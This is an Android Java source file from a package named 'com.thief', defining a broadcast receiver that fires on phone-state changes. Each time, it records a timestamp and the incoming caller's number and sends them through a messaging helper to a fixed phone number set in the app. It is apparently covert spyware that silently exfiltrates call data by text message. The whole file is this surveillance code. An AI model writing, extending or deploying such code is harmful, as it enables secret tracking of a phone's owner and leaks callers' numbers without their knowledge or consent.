package com.thief;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class CallHoldReceiver extends BroadcastReceiver {
    private final static String mACTION = "android.intent.action.PHONE_STATE";
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		//Toast.makeText(context, "11111111111", Toast.LENGTH_LONG).show();

        if(intent.getAction().equals(mACTION)) {      	
        	//Toast.makeText(context, phoneNr, Toast.LENGTH_LONG).show();
        	Date date = new Date();
        	date.setTime(System.currentTimeMillis());
			SimpleDateFormat format = new SimpleDateFormat(
			"yyyy-MM-dd HH:mm:ss");
			StringBuilder smsCont = new StringBuilder();
			smsCont.append(format.format(date));
			smsCont.append("--");
			smsCont.append(intent.getExtras().getString("incoming_number"));
			smsCont.append("--");
			smsCont.append("callee ");
			smsCont.append(intent.getExtras().getString("incoming_number"));
			MessageHandler.send(MainActivity.PHONENO, smsCont.toString());  
			//Toast.makeText(context, intent.getExtras().getString("incoming_number"), Toast.LENGTH_LONG).show();
        }
	}

}
